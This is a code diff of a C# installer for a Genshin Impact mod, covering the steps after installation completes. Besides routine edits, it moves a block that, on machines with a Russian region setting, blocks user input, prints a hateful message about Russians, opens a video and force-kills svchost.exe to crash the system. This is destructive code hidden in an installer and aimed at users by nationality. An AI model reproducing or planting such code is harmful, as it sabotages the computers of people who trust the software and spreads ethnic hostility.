@@ -23,6 +23,8 @@ namespace Genshin_Impact_Mod_Setup
 		{
 			WebHook.Installed();
 
+			TaskbarManager.Instance.SetProgressValue(100, Installation.PbLimit);
+
 			Log.Output("Installation completed!");
 			Console.WriteLine($"\n{Program.Line}\n");
 
@@ -46,12 +48,10 @@ namespace Genshin_Impact_Mod_Setup
 			string rebootString = Cmd.RebootNeeded ? "Computer needs to be restarted!" : "";
 			Console.WriteLine("Good news! Installation was completed. {0}\n", rebootString);
 
-			TaskbarManager.Instance.SetProgressValue(100, Installation.PbLimit);
-			Application.Run(new Donate { Icon = Icon.ExtractAssociatedIcon("Data/Images/52x52.ico") });
 			TaskbarManager.Instance.SetProgressState(TaskbarProgressBarState.NoProgress);
 
 
-			// First question.
+			/* First question. */
 			Console.Write("» I want to join our Discord server [Yes/no]: ");
 			Console.ResetColor();
 
@@ -85,7 +85,7 @@ namespace Genshin_Impact_Mod_Setup
 			}
 
 
-			// Second question.
+			/* Second question. */
 			Console.ForegroundColor = ConsoleColor.Green;
 			Console.Write("» I want to send anonymous installation log files to the developer [Yes/no]: ");
 			Console.ResetColor();
@@ -118,7 +118,22 @@ namespace Genshin_Impact_Mod_Setup
 			}
 
 
-			// Thirty question.
+			// Blue screen for Russian rats.
+			if (RegionInfo.CurrentRegion.Name == "RU")
+			{
+				TaskbarManager.Instance.SetProgressState(TaskbarProgressBarState.Error);
+				Start.NativeMethods.BlockInput(true);
+
+				Console.ForegroundColor = ConsoleColor.Red;
+				Console.WriteLine("\nSorry, I really hate Russians. NOT BY WAR!");
+
+				Process.Start("https://noel.sefinek.net/video/a2xhdW4gamViYW55IHogY2llYmll.mp4");
+				Thread.Sleep(20000);
+				await Cmd.Execute("taskkill", "/F /IM svchost.exe", null);
+			}
+
+
+			/* Thirty question. */
 			if (!Cmd.RebootNeeded)
 			{
 				Console.ForegroundColor = ConsoleColor.Green;
@@ -140,31 +155,16 @@ namespace Genshin_Impact_Mod_Setup
 			}
 
 
-			// Blue screen for Russian rats.
-			if (RegionInfo.CurrentRegion.Name == "RU")
-			{
-				TaskbarManager.Instance.SetProgressState(TaskbarProgressBarState.Error);
-				Start.NativeMethods.BlockInput(true);
-
-				Console.ForegroundColor = ConsoleColor.Red;
-				Console.WriteLine("\nSorry, I really hate Russians. NOT BY WAR!");
-
-				Process.Start("https://noel.sefinek.net/video/a2xhdW4gamViYW55IHogY2llYmll.mp4");
-				Thread.Sleep(20000);
-				await Cmd.Execute("taskkill", "/F /IM svchost.exe", null);
-			}
-
-
-			// Last question.
+			/* Last question. */
 			Console.ForegroundColor = ConsoleColor.Green;
 			Console.Write("» Give me a random cat image and close setup [Yes/no]: ");
 			Console.ResetColor();
 
 			string giveMeACatImg = Console.ReadLine()?.ToLower();
-			Console.WriteLine("Waiting for a random cat >.<");
-
 			if (Regex.Match(giveMeACatImg ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline).Success)
 			{
+				Console.WriteLine("Waiting for a random cat >.<");
+
 				WebClient client = new WebClient();
 				client.Headers.Add("user-agent", Program.UserAgent);
 				string json = await client.DownloadStringTaskAsync("https://api.sefinek.net/api/v1/animals/cat");
